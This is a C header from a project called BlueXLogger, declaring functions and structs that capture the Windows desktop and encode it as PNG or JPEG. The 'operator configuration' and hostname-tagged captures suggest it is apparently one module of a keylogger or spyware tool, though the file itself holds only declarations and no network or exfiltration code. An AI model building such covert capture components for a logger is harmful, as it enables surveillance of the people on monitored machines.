/*============================================================================
 * BlueXLogger - bxl_screenshot.h
 * Desktop capture via GDI, encoded to PNG/JPEG via WIC.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Capture is a single BitBlt of the virtual desktop into a top-down 32bpp
 * DIB section, then handed to WIC for encoding. Alpha is forced opaque so
 * PNG output is not transparent.
 *==========================================================================*/
#ifndef BXL_SCREENSHOT_H
#define BXL_SCREENSHOT_H

#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_util.h"

typedef struct BxlShotOptions {
    int     monitors;       /* BXL_MON_ALL | BXL_MON_PRIMARY            */
    int     format;         /* BXL_FMT_PNG | BXL_FMT_JPEG               */
    int     jpeg_quality;   /* 1..100                                   */
    bxl_u32 max_dim;        /* downscale longest edge; 0 = keep native  */
} BxlShotOptions;

typedef struct BxlShot {
    void  *data;            /* encoded bytes, free with bxl_shot_free() */
    size_t len;
    int    width;
    int    height;
    char   mime_type[64];
    char   filename[256];
} BxlShot;

/* Initialise COM + the WIC factory. Call once per capturing thread. */
int  bxl_screenshot_init(void);
void bxl_screenshot_shutdown(void);
int  bxl_screenshot_ready(void);

/* Fill options from the operator configuration. */
void bxl_screenshot_options_from(const BxlConfig *cfg, BxlShotOptions *out);

/* Capture and encode. Returns BXL_TRUE on success. */
int  bxl_screenshot_capture(const BxlShotOptions *opt, const char *hostname,
                            BxlShot *out);

/* Convenience: capture straight to a file. */
int  bxl_screenshot_capture_to_file(const BxlShotOptions *opt,
                                    const char *hostname,
                                    const wchar_t *dir,
                                    wchar_t *path_out, size_t path_cch);

void bxl_shot_free(BxlShot *s);

/* Dimensions of the capture area for the given monitor mode. */
int  bxl_screenshot_area(int monitors, int *x, int *y, int *w, int *h);

#endif /* BXL_SCREENSHOT_H */
